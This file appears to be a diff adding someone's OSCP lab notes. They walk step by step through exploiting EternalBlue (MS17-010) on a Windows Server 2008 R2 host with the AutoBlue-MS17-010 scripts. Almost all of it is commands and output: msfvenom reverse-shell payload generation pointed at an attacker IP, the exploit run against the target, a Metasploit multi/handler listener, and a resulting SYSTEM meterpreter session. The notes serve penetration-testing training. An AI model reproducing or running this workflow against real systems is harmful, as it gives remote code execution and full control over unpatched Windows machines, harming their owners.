@@ -1,0 +1,172 @@
+
+=== SMB Eternalblue, MS17-010 ===
+
+windows/smb/ms17_010_eternalblue
+windows/smb/ms17_010_psexec
+Microsoft Windows Windows 7/2008 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                            | win_x86-64/remote/42031.py
+Microsoft Windows Windows 8/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)   
+
+| win_x86-64/remote/42030.py
+windows/smb/ms09_050_smb2_negotiate_func_index
+
+
+== SMB, ETERNALBLUE, WITHOUT metasploit, but with meterpreter or cmd, MS17-010
+## https://github.com/worawit/MS17-010 .Worked, tested inside OSCP labs. First revert the target!!!
+
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+Cloning into 'AutoBlue-MS17-010'...
+
+cd AutoBlue-MS17-010/
+chmod 777 ./*
+cd shellcode/
+./shell_prep.sh 
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y
+LHOST for reverse connection:
+10.11.0.x
+LPORT you want x64 to listen on:
+4444
+LPORT you want x86 to listen on:
+5555
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+0
+Generating x64 meterpreter shell...
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.11.0.169 LPORT=4444
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 511 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 meterpreter shell...
+
+msfvenom -p windows/meterpreter/reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.11.0.169 LPORT=5555
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 362 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE
+
+cd ..
+
+python eternalblue_exploit7.py 10.11.1.220 ./shellcode/sc_all.bin 
+shellcode size: 2292
+numGroomConn: 13
+Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+done
+       
+cd ..
+chmod 777 -R ./*
+./listener_prep.sh 
+  __
+  /,-
+  ||)
+  \\_, )
+   `--'
+Enternal Blue Metasploit Listener
+
+LHOST for reverse connection:
+10.11.0.x
+LPORT for x64 reverse connection:
+4444
+LPORT for x86 reverse connection:
+5555
+Enter 0 for meterpreter shell or 1 for regular cmd shell:
+0
+Starting listener...
+[ ok ] Starting postgresql (via systemctl): postgresql.service.
+                                                  
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+
+
+       =[ metasploit v4.16.43-dev                         ]
++ -- --=[ 1742 exploits - 996 auxiliary - 301 post        ]
++ -- --=[ 526 payloads - 40 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+[*] Processing config.rc for ERB directives.
+resource (config.rc)> use exploit/multi/handler
+resource (config.rc)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+resource (config.rc)> set LHOST 10.11.0.169
+LHOST => 10.11.0.169
+resource (config.rc)> set LPORT 4444
+LPORT => 4444
+resource (config.rc)> set ExitOnSession false
+ExitOnSession => false
+resource (config.rc)> set EXITFUNC thread
+EXITFUNC => thread
+resource (config.rc)> exploit -j
+[*] Exploit running as background job 0.
+resource (config.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+resource (config.rc)> set LPORT 5555
+[*] Started reverse TCP handler on 10.11.0.169:4444 
+LPORT => 5555
+resource (config.rc)> exploit -j
+[*] Exploit running as background job 1.
+
+[*] Started reverse TCP handler on 10.11.0.169:5555 
+
+========
+On the attacker mahcine:
+root@kali:~/Desktop/OSCP/scans/# sudo python ./eternalblue_exploit7.py 10.11.1.x ./shellcode/sc_all.bin 
+shellcode size: 2292
+numGroomConn: 13
+Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+done
+=========
+
+The result:
+===========
+msf exploit(multi/handler) > 
+[*] Sending stage (206403 bytes) to 10.11.1.220
+[*] Meterpreter session 1 opened (10.11.0.169:4444 -> 10.11.1.220:49233) at 2018-03-18 08:02:12 -0400
+id
+[*] exec: id
+
+uid=0(root) gid=0(root) groups=0(root)
+msf exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ MASTER  10.11.0.xxx:4444 -> 10.11.1.xxx:49233 (10.11.1.xxx)
+
+msf exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > 
